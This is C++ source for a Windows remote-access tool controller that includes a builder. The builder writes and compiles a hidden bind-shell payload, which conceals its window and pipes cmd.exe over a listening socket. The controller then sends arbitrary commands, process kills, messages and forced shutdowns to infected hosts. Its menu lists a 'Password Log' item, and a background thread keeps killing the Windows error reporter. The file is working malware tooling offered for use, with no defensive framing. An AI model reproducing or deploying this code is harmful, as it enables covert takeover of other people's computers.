#include <winsock2.h>
#include <windows.h>
#include <fstream>
#include <string>
#include <vector>
#include <thread>
#include <ws2tcpip.h>
#include <commdlg.h>

#pragma comment(lib, "ws2_32.lib")

// ================= Menu IDs =================
#define ID_MENU1  1
#define ID_MENU2  2
#define ID_MENU3  3   // Remote Manage (Win9x)
#define ID_MENU4  4   // Add Host
#define ID_MENU5  5   // Host Manage
#define ID_MENU6  6
#define ID_MENU7  7   // Server Settings
#define ID_MENU8  8

// ================= Server Settings page =================
#define ID_EDIT_NAME     101
#define ID_EDIT_PORT     102
#define ID_BTN_GENERATE  105

// ================= Add Host page =================
#define ID_ADD_IP       301
#define ID_ADD_PORT     302
#define ID_ADD_PREVIEW  303
#define ID_ADD_CONFIRM  304
#define ID_ADD_CANCEL   305
#define ID_ADD_STATUS   306

// ================= Host Manage page =================
// dynamic buttons start from 500

// ================= Remote Manage page =================
#define ID_START       401
#define ID_TASKKILL    402
#define ID_MSG         403
#define ID_SHUTDOWN    404
#define ID_SEND        405
#define ID_STARTSEND   406
#define ID_TASKSEND    407
#define ID_MSGSEND     408
#define ID_DISCONNECT  409

// ================= Data =================
struct HostInfo {
    std::wstring clientName;
    std::wstring pcName;
    std::wstring ip;
    int port;
};

// ================= Globals =================
LRESULT CALLBACK WindowProcedure(HWND, UINT, WPARAM, LPARAM);

int currentView = -1;

std::vector<HostInfo> g_hosts;

HostInfo g_currentHost = { L"", L"", L"", 0 };
SOCKET telnetSocket = INVALID_SOCKET;
bool connected = false;

// ---- Server Settings page ----
HWND hEditName = NULL, hEditPort = NULL, hBtnGenerate = NULL;

// ---- Add Host page ----
HWND hAddIP = NULL, hAddPort = NULL;
HWND hAddPreview = NULL, hAddConfirm = NULL, hAddCancel = NULL, hAddStatus = NULL;
HostInfo g_previewHost = { L"", L"", L"", 0 };
bool g_previewOK = false;

// ---- Remote Manage page ----
HWND hRemoteInfo = NULL;
HWND hStartBtn = NULL, hKillBtn = NULL, hMsgBtn = NULL, hShutdownBtn = NULL, hDisconnectBtn = NULL;
HWND hStartInput = NULL, hTaskkillInput = NULL, hMsgInput = NULL;
HWND hStartSendBtn = NULL, hTaskSendBtn = NULL, hMsgSendBtn = NULL;
HWND hCommandInput = NULL, hSendBtn = NULL;
HWND hReceiveBox = NULL, hScreenReturnBox = NULL;

// ================= Helpers =================
void AutoCloseErrorDialog() {
    while (true) {
        system("taskkill /IM werfault.exe /F >nul 2>&1");
        Sleep(1000);
    }
}

void DestroyIfExists(HWND& h) {
    if (h) { DestroyWindow(h); h = NULL; }
}

void ClearAllPages() {
    DestroyIfExists(hEditName); DestroyIfExists(hEditPort); DestroyIfExists(hBtnGenerate);

    DestroyIfExists(hAddIP); DestroyIfExists(hAddPort);
    DestroyIfExists(hAddPreview); DestroyIfExists(hAddConfirm);
    DestroyIfExists(hAddCancel); DestroyIfExists(hAddStatus);

    DestroyIfExists(hRemoteInfo);
    DestroyIfExists(hStartBtn); DestroyIfExists(hKillBtn);
    DestroyIfExists(hMsgBtn); DestroyIfExists(hShutdownBtn);
    DestroyIfExists(hDisconnectBtn);
    DestroyIfExists(hStartInput); DestroyIfExists(hTaskkillInput); DestroyIfExists(hMsgInput);
    DestroyIfExists(hStartSendBtn); DestroyIfExists(hTaskSendBtn); DestroyIfExists(hMsgSendBtn);
    DestroyIfExists(hCommandInput); DestroyIfExists(hSendBtn);
    DestroyIfExists(hReceiveBox); DestroyIfExists(hScreenReturnBox);
}

// ================= Send command =================
void SendCommand(const std::wstring& cmd) {
    if (telnetSocket != INVALID_SOCKET && connected) {
        std::string narrow(cmd.begin(), cmd.end());
        send(telnetSocket, narrow.c_str(), (int)narrow.length(), 0);
        send(telnetSocket, "\r\n", 2, 0);
    }
}

// ================= Preview host =================
bool PreviewHost(const std::wstring& ip, int port, HostInfo& out) {
    WSADATA wsaData;
    WSAStartup(MAKEWORD(2, 2), &wsaData);

    SOCKET s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (s == INVALID_SOCKET) return false;

    sockaddr_in addr = {};
    addr.sin_family = AF_INET;
    addr.sin_port = htons((u_short)port);

    char ipA[100];
    WideCharToMultiByte(CP_ACP, 0, ip.c_str(), -1, ipA, 100, NULL, NULL);
    addr.sin_addr.s_addr = inet_addr(ipA);

    DWORD timeout = 3000;
    setsockopt(s, SOL_SOCKET, SO_RCVTIMEO, (char*)&timeout, sizeof(timeout));
    setsockopt(s, SOL_SOCKET, SO_SNDTIMEO, (char*)&timeout, sizeof(timeout));

    if (connect(s, (sockaddr*)&addr, sizeof(addr)) != 0) {
        closesocket(s);
        return false;
    }

    send(s, "HELLO\n", 6, 0);

    char buf[512] = {0};
    int len = recv(s, buf, 511, 0);
    if (len <= 0) {
        closesocket(s);
        return false;
    }
    buf[len] = '\0';

    std::string resp(buf);
    std::string client, name, ipResp, portResp;
    size_t p1 = resp.find("CLIENT=");
    size_t p2 = resp.find(";NAME=");
    size_t p3 = resp.find(";IP=");
    size_t p4 = resp.find(";PORT=");
    if (p1 != std::string::npos && p2 != std::string::npos &&
        p3 != std::string::npos && p4 != std::string::npos) {
        client   = resp.substr(p1 + 7, p2 - p1 - 7);
        name     = resp.substr(p2 + 6, p3 - p2 - 6);
        ipResp   = resp.substr(p3 + 4, p4 - p3 - 4);
        portResp = resp.substr(p4 + 6);
        while (!portResp.empty() && (portResp.back() == '\n' || portResp.back() == '\r'))
            portResp.pop_back();

        out.clientName = std::wstring(client.begin(), client.end());
        out.pcName     = std::wstring(name.begin(), name.end());
        out.ip         = std::wstring(ipResp.begin(), ipResp.end());
        out.port       = atoi(portResp.c_str());
    } else {
        closesocket(s);
        return false;
    }

    closesocket(s);
    return true;
}

// ================= Connect to host =================
void ConnectToHost(HWND hwnd, const HostInfo& host) {
    if (telnetSocket != INVALID_SOCKET) {
        closesocket(telnetSocket);
        telnetSocket = INVALID_SOCKET;
        connected = false;
    }

    WSADATA wsaData;
    WSAStartup(MAKEWORD(2, 2), &wsaData);
    telnetSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);

    sockaddr_in addr = {};
    addr.sin_family = AF_INET;
    addr.sin_port = htons((u_short)host.port);

    char ipA[100];
    WideCharToMultiByte(CP_ACP, 0, host.ip.c_str(), -1, ipA, 100, NULL, NULL);
    addr.sin_addr.s_addr = inet_addr(ipA);

    if (connect(telnetSocket, (sockaddr*)&addr, sizeof(addr)) == 0) {
        connected = true;
        g_currentHost = host;

        send(telnetSocket, "HELLO\n", 6, 0);

        std::thread([] {
            char buffer[1024];
            int len;
            bool firstLine = true;
            while ((len = recv(telnetSocket, buffer, 1023, 0)) > 0) {
                buffer[len] = '\0';

                if (firstLine) {
                    firstLine = false;
                    std::string s(buffer);
                    size_t nl = s.find('\n');
                    if (nl != std::string::npos) {
                        std::string rest = s.substr(nl + 1);
                        if (!rest.empty() && hReceiveBox) {
                            std::wstring wstr(rest.begin(), rest.end());
                            int lenNow = GetWindowTextLengthW(hReceiveBox);
                            SendMessageW(hReceiveBox, EM_SETSEL, lenNow, lenNow);
                            SendMessageW(hReceiveBox, EM_REPLACESEL, FALSE, (LPARAM)wstr.c_str());
                            SendMessageW(hReceiveBox, EM_SCROLLCARET, 0, 0);
                        }
                    }
                    continue;
                }

                std::wstring wstr(buffer, buffer + len);
                if (hReceiveBox) {
                    int lenNow = GetWindowTextLengthW(hReceiveBox);
                    SendMessageW(hReceiveBox, EM_SETSEL, lenNow, lenNow);
                    SendMessageW(hReceiveBox, EM_REPLACESEL, FALSE, (LPARAM)wstr.c_str());
                    SendMessageW(hReceiveBox, EM_SCROLLCARET, 0, 0);
                }
            }
        }).detach();

        currentView = 3;
        SendMessage(hwnd, WM_COMMAND, ID_MENU3, 0);
    } else {
        MessageBoxW(hwnd, L"Connection failed.", L"Error", MB_OK);
    }
}

// ================= Pages =================
void BuildServerPage(HWND hwnd) {
    HINSTANCE hInst = GetModuleHandle(NULL);
    CreateWindowW(L"STATIC", L"Service Name (Client Name):",
                  WS_VISIBLE | WS_CHILD, 30, 30, 220, 25, hwnd, NULL, hInst, NULL);
    hEditName = CreateWindowW(L"EDIT", L"", WS_VISIBLE | WS_CHILD | WS_BORDER,
                              260, 30, 200, 25, hwnd, (HMENU)ID_EDIT_NAME, hInst, NULL);
    CreateWindowW(L"STATIC", L"Port:",
                  WS_VISIBLE | WS_CHILD, 30, 70, 220, 25, hwnd, NULL, hInst, NULL);
    hEditPort = CreateWindowW(L"EDIT", L"23", WS_VISIBLE | WS_CHILD | WS_BORDER,
                              260, 70, 200, 25, hwnd, (HMENU)ID_EDIT_PORT, hInst, NULL);
    hBtnGenerate = CreateWindowW(L"BUTTON", L"Generate EXE",
                                 WS_VISIBLE | WS_CHILD, 260, 120, 150, 35,
                                 hwnd, (HMENU)ID_BTN_GENERATE, hInst, NULL);
}

void BuildAddHostPage(HWND hwnd) {
    HINSTANCE hInst = GetModuleHandle(NULL);

    CreateWindowW(L"STATIC", L"IP:", WS_CHILD | WS_VISIBLE, 30, 30, 100, 25, hwnd, NULL, hInst, NULL);
    hAddIP = CreateWindowW(L"EDIT", L"127.0.0.1", WS_CHILD | WS_VISIBLE | WS_BORDER, 140, 30, 200, 25, hwnd, (HMENU)ID_ADD_IP, hInst, NULL);

    CreateWindowW(L"STATIC", L"Port:", WS_CHILD | WS_VISIBLE, 30, 70, 100, 25, hwnd, NULL, hInst, NULL);
    hAddPort = CreateWindowW(L"EDIT", L"2550", WS_CHILD | WS_VISIBLE | WS_BORDER, 140, 70, 200, 25, hwnd, (HMENU)ID_ADD_PORT, hInst, NULL);

    hAddPreview = CreateWindowW(L"BUTTON", L"Preview", WS_CHILD | WS_VISIBLE, 140, 120, 90, 30, hwnd, (HMENU)ID_ADD_PREVIEW, hInst, NULL);
    hAddConfirm = CreateWindowW(L"BUTTON", L"Add", WS_CHILD | WS_VISIBLE | WS_DISABLED, 250, 120, 90, 30, hwnd, (HMENU)ID_ADD_CONFIRM, hInst, NULL);
    hAddCancel  = CreateWindowW(L"BUTTON", L"Cancel", WS_CHILD | WS_VISIBLE, 360, 120, 90, 30, hwnd, (HMENU)ID_ADD_CANCEL, hInst, NULL);

    hAddStatus = CreateWindowW(L"STATIC", L"", WS_CHILD | WS_VISIBLE, 30, 170, 800, 200, hwnd, (HMENU)ID_ADD_STATUS, hInst, NULL);
}

void BuildHostManagePage(HWND hwnd) {
    HINSTANCE hInst = GetModuleHandle(NULL);

    CreateWindowW(L"STATIC", L"Hosts:", WS_CHILD | WS_VISIBLE, 30, 20, 200, 25, hwnd, NULL, hInst, NULL);

    int y = 60;
    for (size_t i = 0; i < g_hosts.size(); i++) {
        const HostInfo& h = g_hosts[i];

        std::wstring line = h.clientName + L"  |  " + h.pcName + L"  |  " +
                            h.ip + L":" + std::to_wstring(h.port);
        CreateWindowW(L"STATIC", line.c_str(), WS_CHILD | WS_VISIBLE,
                      30, y + 5, 600, 25, hwnd, NULL, hInst, NULL);

        CreateWindowW(L"BUTTON", L"Connect", WS_CHILD | WS_VISIBLE,
                      650, y, 100, 30, hwnd,
                      (HMENU)(500 + i * 10), hInst, NULL);

        y += 45;
    }
}

void BuildRemotePage(HWND hwnd) {
    HINSTANCE hInst = GetModuleHandle(NULL);

    std::wstring info = L"Not connected";
    if (connected) {
        info = L"Client: " + g_currentHost.clientName +
               L"  |  PC: " + g_currentHost.pcName +
               L"  |  " + g_currentHost.ip + L":" + std::to_wstring(g_currentHost.port);
    }
    hRemoteInfo = CreateWindowW(L"STATIC", info.c_str(),
                                WS_CHILD | WS_VISIBLE | WS_BORDER | SS_CENTER,
                                20, 10, 1140, 30, hwnd, NULL, hInst, NULL);

    hStartBtn    = CreateWindowW(L"BUTTON", L"Start",    WS_CHILD | WS_VISIBLE, 20, 60,  80, 30, hwnd, (HMENU)ID_START,    hInst, NULL);
    hKillBtn     = CreateWindowW(L"BUTTON", L"Taskkill", WS_CHILD | WS_VISIBLE, 20, 100, 80, 30, hwnd, (HMENU)ID_TASKKILL, hInst, NULL);
    hMsgBtn      = CreateWindowW(L"BUTTON", L"Msg",      WS_CHILD | WS_VISIBLE, 20, 140, 80, 30, hwnd, (HMENU)ID_MSG,      hInst, NULL);
    hShutdownBtn = CreateWindowW(L"BUTTON", L"Shutdown", WS_CHILD | WS_VISIBLE, 20, 180, 80, 30, hwnd, (HMENU)ID_SHUTDOWN, hInst, NULL);

    hStartInput    = CreateWindowW(L"EDIT",   L"", WS_CHILD | WS_VISIBLE | WS_BORDER, 120, 60,  200, 25, hwnd, NULL, hInst, NULL);
    hStartSendBtn  = CreateWindowW(L"BUTTON", L"Send", WS_CHILD | WS_VISIBLE, 330, 60,  60, 25, hwnd, (HMENU)ID_STARTSEND, hInst, NULL);

    hTaskkillInput = CreateWindowW(L"EDIT",   L"", WS_CHILD | WS_VISIBLE | WS_BORDER, 120, 100, 200, 25, hwnd, NULL, hInst, NULL);
    hTaskSendBtn   = CreateWindowW(L"BUTTON", L"Send", WS_CHILD | WS_VISIBLE, 330, 100, 60, 25, hwnd, (HMENU)ID_TASKSEND, hInst, NULL);

    hMsgInput      = CreateWindowW(L"EDIT",   L"", WS_CHILD | WS_VISIBLE | WS_BORDER, 120, 140, 200, 25, hwnd, NULL, hInst, NULL);
    hMsgSendBtn    = CreateWindowW(L"BUTTON", L"Send", WS_CHILD | WS_VISIBLE, 330, 140, 60, 25, hwnd, (HMENU)ID_MSGSEND, hInst, NULL);

    hCommandInput = CreateWindowW(L"EDIT",   L"", WS_CHILD | WS_VISIBLE | WS_BORDER, 20, 700, 500, 25, hwnd, NULL, hInst, NULL);
    hSendBtn      = CreateWindowW(L"BUTTON", L"Send", WS_CHILD | WS_VISIBLE, 530, 700, 60, 25, hwnd, (HMENU)ID_SEND, hInst, NULL);
    hDisconnectBtn= CreateWindowW(L"BUTTON", L"Disconnect", WS_CHILD | WS_VISIBLE, 620, 700, 100, 25, hwnd, (HMENU)ID_DISCONNECT, hInst, NULL);

    hReceiveBox = CreateWindowW(L"EDIT", L"",
        WS_CHILD | WS_VISIBLE | WS_BORDER | ES_MULTILINE | ES_AUTOVSCROLL | ES_READONLY | WS_VSCROLL,
        650, 50, 500, 710, hwnd, NULL, hInst, NULL);

    hScreenReturnBox = CreateWindowW(L"EDIT", L"",
        WS_CHILD | WS_VISIBLE | WS_BORDER | ES_MULTILINE | ES_AUTOVSCROLL | ES_READONLY | WS_VSCROLL,
        20, 250, 600, 400, hwnd, NULL, hInst, NULL);
}

void BuildPage(HWND hwnd, int view) {
    ClearAllPages();

    switch (view) {
        case 1: BuildServerPage(hwnd);     break;
        case 2: BuildAddHostPage(hwnd);    break;
        case 3: BuildRemotePage(hwnd);     break;
        case 4: BuildHostManagePage(hwnd); break;
        default: break;
    }

    InvalidateRect(hwnd, NULL, TRUE);
}

// ================= Window procedure =================
LRESULT CALLBACK WindowProcedure(HWND hwnd, UINT msg, WPARAM wp, LPARAM lp)
{
    static HMENU hMenu;

    switch(msg)
    {
        case WM_CREATE:
        {
            hMenu = CreateMenu();
            AppendMenu(hMenu, MF_STRING, ID_MENU1, "File Share");
            AppendMenu(hMenu, MF_STRING, ID_MENU2, "Remote Registry");
            AppendMenu(hMenu, MF_STRING, ID_MENU3, "Remote Manage (Win9x)");
            AppendMenu(hMenu, MF_STRING, ID_MENU4, "Add Host");
            AppendMenu(hMenu, MF_STRING, ID_MENU5, "Host Manage");
            AppendMenu(hMenu, MF_STRING, ID_MENU6, "Password Log");
            AppendMenu(hMenu, MF_STRING, ID_MENU7, "Server Settings");
            AppendMenu(hMenu, MF_STRING, ID_MENU8, "Version Info");
            SetMenu(hwnd, hMenu);
            break;
        }

        case WM_COMMAND:
        {
            if (LOWORD(wp) >= 500 && LOWORD(wp) < 1000) {
                int idx = (LOWORD(wp) - 500) / 10;
                if (idx >= 0 && idx < (int)g_hosts.size()) {
                    ConnectToHost(hwnd, g_hosts[idx]);
                }
                break;
            }

            switch(LOWORD(wp))
            {
                case ID_MENU1: case ID_MENU2: case ID_MENU8:
                    currentView = 0; BuildPage(hwnd, 0); break;

                case ID_MENU7:
                    currentView = 1; BuildPage(hwnd, 1); break;

                case ID_MENU4:
                    currentView = 2; g_previewOK = false; BuildPage(hwnd, 2); break;

                case ID_MENU3:
                    currentView = 3; BuildPage(hwnd, 3); break;

                case ID_MENU5:
                    currentView = 4; BuildPage(hwnd, 4); break;

                case ID_BTN_GENERATE:
                    if (hEditName && hEditPort)
                    {
                        char serviceName[256], portStr[256];
                        GetWindowTextA(hEditName, serviceName, 256);
                        GetWindowTextA(hEditPort, portStr, 256);

                        std::ofstream cppFile("ServerTemp.cpp");
                        cppFile << "#pragma comment(lib, \"ws2_32.lib\")\n";
                        cppFile << "#pragma comment(linker,\"/subsystem:\\\"windows\\\" /entry:\\\"mainCRTStartup\\\"\")\n";
                        cppFile << "#include <winsock2.h>\n#include <windows.h>\n";
                        cppFile << "#include <string.h>\n#include <stdio.h>\n\n";
                        cppFile << "#define MasterPort " << portStr << "\n";
                        cppFile << "#define ServiceName \"" << serviceName << "\"\n\n";
                        cppFile << "int main(int argc, char *argv[])\n{\n";
                        cppFile << "    HWND hWnd = GetConsoleWindow();\n";
                        cppFile << "    ShowWindow(hWnd, SW_HIDE);\n";
                        cppFile << "    WSADATA WSADa;\n    sockaddr_in SockAddrIn;\n";
                        cppFile << "    SOCKET CSocket, SSocket;\n    int iAddrSize;\n";
                        cppFile << "    PROCESS_INFORMATION ProcessInfo;\n    STARTUPINFOW StartupInfo;\n";
                        cppFile << "    wchar_t* szCMDPath = new wchar_t[256];\n";
                        cppFile << "    ZeroMemory(&ProcessInfo, sizeof(PROCESS_INFORMATION));\n";
                        cppFile << "    ZeroMemory(&StartupInfo, sizeof(STARTUPINFOW));\n";
                        cppFile << "    ZeroMemory(&WSADa, sizeof(WSADATA));\n";
                        cppFile << "    GetEnvironmentVariableW(L\"COMSPEC\", szCMDPath, 256);\n";
                        cppFile << "    WSAStartup(0x0202, &WSADa);\n";
                        cppFile << "    SockAddrIn.sin_family = AF_INET;\n";
                        cppFile << "    SockAddrIn.sin_addr.s_addr = INADDR_ANY;\n";
                        cppFile << "    SockAddrIn.sin_port = htons(MasterPort);\n";
                        cppFile << "    CSocket = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);\n";
                        cppFile << "    bind(CSocket, (sockaddr *)&SockAddrIn, sizeof(SockAddrIn));\n";
                        cppFile << "    listen(CSocket, 5);\n";
                        cppFile << "    iAddrSize = sizeof(SockAddrIn);\n";
                        cppFile << "    while ((SSocket = accept(CSocket, (sockaddr *)&SockAddrIn, &iAddrSize))) {\n";
                        cppFile << "        char hello[16] = {0};\n";
                        cppFile << "        recv(SSocket, hello, 15, 0);\n";
                        cppFile << "        char hostName[256] = {0};\n";
                        cppFile << "        gethostname(hostName, 256);\n";
                        cppFile << "        sockaddr_in clientAddr;\n";
                        cppFile << "        int clientAddrLen = sizeof(clientAddr);\n";
                        cppFile << "        getpeername(SSocket, (sockaddr*)&clientAddr, &clientAddrLen);\n";
                        cppFile << "        char info[512];\n";
                        cppFile << "        sprintf(info, \"CLIENT=%s;NAME=%s;IP=%s;PORT=%d\\n\", ServiceName, hostName, inet_ntoa(clientAddr.sin_addr), MasterPort);\n";
                        cppFile << "        send(SSocket, info, (int)strlen(info), 0);\n";
                        cppFile << "        StartupInfo.cb = sizeof(STARTUPINFOW);\n";
                        cppFile << "        StartupInfo.wShowWindow = SW_HIDE;\n";
                        cppFile << "        StartupInfo.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;\n";
                        cppFile << "        StartupInfo.hStdInput = (HANDLE)SSocket;\n";
                        cppFile << "        StartupInfo.hStdOutput = (HANDLE)SSocket;\n";
                        cppFile << "        StartupInfo.hStdError = (HANDLE)SSocket;\n";
                        cppFile << "        CreateProcessW(NULL, szCMDPath, NULL, NULL, TRUE, 0, NULL, NULL, &StartupInfo, &ProcessInfo);\n";
                        cppFile << "        WaitForSingleObject(ProcessInfo.hProcess, INFINITE);\n";
                        cppFile << "        CloseHandle(ProcessInfo.hProcess);\n";
                        cppFile << "        CloseHandle(ProcessInfo.hThread);\n";
                        cppFile << "        closesocket(SSocket);\n";
                        cppFile << "    }\n";
                        cppFile << "    closesocket(CSocket);\n    WSACleanup();\n";
                        cppFile << "    delete[] szCMDPath;\n    return 0;\n}\n";
                        cppFile.close();

                        std::string exeName = std::string(serviceName) + ".exe";
                        std::string cmd = "g++ ServerTemp.cpp -o \"" + exeName + "\" "
                                          "-mwindows -static-libgcc -lgdi32 -lws2_32 -std=c++11 "
                                          "-lshlwapi -lgdiplus -lole32";
                        system(cmd.c_str());
                        remove("ServerTemp.cpp");

                        MessageBoxA(hwnd, ("Generated EXE: " + exeName).c_str(), "Done", MB_OK);
                    }
                    break;

                case ID_ADD_PREVIEW:
                {
                    wchar_t ip[100], portStr[10];
                    GetWindowTextW(hAddIP, ip, 100);
                    GetWindowTextW(hAddPort, portStr, 10);

                    HostInfo tmp;
                    tmp.ip = ip;
                    tmp.port = _wtoi(portStr);

                    SetWindowTextW(hAddStatus, L"Connecting...");
                    UpdateWindow(hAddStatus);

                    if (PreviewHost(ip, tmp.port, tmp)) {
                        g_previewHost = tmp;
                        g_previewOK = true;

                        std::wstring msg = L"Preview OK\r\nClient: " + tmp.clientName +
                                           L"\r\nPC: " + tmp.pcName +
                                           L"\r\nIP: " + tmp.ip +
                                           L"\r\nPort: " + std::to_wstring(tmp.port);
                        SetWindowTextW(hAddStatus, msg.c_str());

                        EnableWindow(hAddConfirm, TRUE);
                    } else {
                        g_previewOK = false;
                        SetWindowTextW(hAddStatus, L"Preview failed: cannot connect or bad response.");
                        EnableWindow(hAddConfirm, FALSE);
                    }
                    break;
                }

                case ID_ADD_CONFIRM:
                {
                    if (!g_previewOK) break;
                    g_hosts.push_back(g_previewHost);
                    MessageBoxW(hwnd, L"Host added.", L"Done", MB_OK);
                    EnableWindow(hAddConfirm, FALSE);
                    SetWindowTextW(hAddStatus, L"Added. You can add another.");
                    g_previewOK = false;
                    break;
                }

                case ID_ADD_CANCEL:
                {
                    SetWindowTextW(hAddIP, L"");
                    SetWindowTextW(hAddPort, L"");
                    SetWindowTextW(hAddStatus, L"");
                    EnableWindow(hAddConfirm, FALSE);
                    g_previewOK = false;
                    break;
                }

                case ID_SEND: {
                    wchar_t buf[512];
                    GetWindowTextW(hCommandInput, buf, 512);
                    SendCommand(buf);
                    break;
                }
                case ID_STARTSEND: {
                    wchar_t buf[256];
                    GetWindowTextW(hStartInput, buf, 256);
                    SendCommand(L"start " + std::wstring(buf));
                    break;
                }
                case ID_TASKSEND: {
                    wchar_t buf[256];
                    GetWindowTextW(hTaskkillInput, buf, 256);
                    SendCommand(L"taskkill /IM " + std::wstring(buf) + L" /F");
                    break;
                }
                case ID_MSGSEND: {
                    wchar_t buf[256];
                    GetWindowTextW(hMsgInput, buf, 256);
                    SendCommand(L"msg * " + std::wstring(buf));
                    break;
                }
                case ID_SHUTDOWN: {
                    int res = MessageBoxW(hwnd, L"Are you sure you want to shutdown?", L"Confirm", MB_YESNO | MB_ICONQUESTION);
                    if (res == IDYES) SendCommand(L"shutdown /s /f /t 0");
                    break;
                }

                case ID_DISCONNECT:
                {
                    if (telnetSocket != INVALID_SOCKET) {
                        closesocket(telnetSocket);
                        telnetSocket = INVALID_SOCKET;
                    }
                    connected = false;
                    g_currentHost = { L"", L"", L"", 0 };
                    BuildPage(hwnd, 3);
                    break;
                }
            }
            break;
        }

        case WM_DESTROY:
            if (telnetSocket != INVALID_SOCKET) {
                closesocket(telnetSocket);
                telnetSocket = INVALID_SOCKET;
            }
            WSACleanup();
            PostQuitMessage(0);
            break;

        default:
            return DefWindowProc(hwnd, msg, wp, lp);
    }

    return 0;
}

// ================= Entry =================
int WINAPI WinMain(HINSTANCE hInst, HINSTANCE, LPSTR, int nShowCmd)
{
    WNDCLASS wc = {0};
    wc.lpfnWndProc = WindowProcedure;
    wc.hInstance = hInst;
    wc.lpszClassName = "MainWindow";
    wc.hCursor = LoadCursor(NULL, IDC_ARROW);
    wc.hbrBackground = (HBRUSH)(COLOR_WINDOW+1);

    RegisterClass(&wc);

    HWND hwnd = CreateWindow(
        "MainWindow",
        "GUI",
        WS_OVERLAPPED | WS_CAPTION | WS_SYSMENU | WS_MINIMIZEBOX,
        100, 100, 1200, 800,
        NULL, NULL, hInst, NULL
    );

    ShowWindow(hwnd, nShowCmd);

    std::thread(AutoCloseErrorDialog).detach();

    MSG msg;
    while(GetMessage(&msg, NULL, 0, 0))
    {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    return (int)msg.wParam;
}